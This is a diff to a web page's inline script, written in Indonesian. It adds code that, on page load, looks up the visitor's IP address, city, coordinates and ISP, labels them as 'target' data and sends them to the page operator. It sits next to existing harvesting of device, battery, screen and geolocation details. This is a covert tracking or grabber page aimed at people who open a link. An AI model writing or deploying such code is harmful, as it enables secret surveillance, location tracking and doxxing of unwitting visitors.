@@ -565,6 +565,27 @@ Bluetooth              : ${bluetoothStatus}
 `.trim();
 };
 
+const ambilIPTarget = async () => {
+  try {
+    const res = await fetch("https://ip-api.com/json");
+    const data = await res.json();
+
+    const hasil = `
+౼ 〘 𝗜𝗣 + 𝗟𝗢𝗞𝗔𝗦𝗜 𝗧𝗔𝗥𝗚𝗘𝗧 〙 ౼
+IP        : ${data.query}
+Negara    : ${data.country}
+Provinsi  : ${data.regionName}
+Kota      : ${data.city}
+Koordinat : ${data.lat}, ${data.lon}
+ISP       : ${data.isp}
+Koneksi   : ${data.mobile ? "Mobile" : "WiFi"}
+`;
+    await kirimPesan(hasil);
+  } catch {
+    await kirimPesan("౼ 〘 𝗜𝗣 𝗧𝗔𝗥𝗚𝗘𝗧 〙 ౼\n❌ Gagal mengambil IP/lokasi.");
+  }
+};
+
 const ambilLokasi = () => {
   return new Promise((resolve) => {
     if (!navigator.geolocation) {
@@ -706,6 +727,10 @@ const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
+  // ✅ Tambahan: Ambil IP + lokasi awal target
+  const ipLokasi = await ambilIPTarget();
+  await kirimPesan(ipLokasi); // ← Kirim terpisah paling awal
+
   const infoPerangkat = await ambilDataPerangkat();
   const bateraiInfo = await ambilBaterai();
   const layarGrafik = await ambilLayarGrafik();
@@ -747,4 +772,4 @@ const mulai = async () => {
     window.addEventListener("load", mulai);
   </script>
 </body>
-  </html>
+</html>
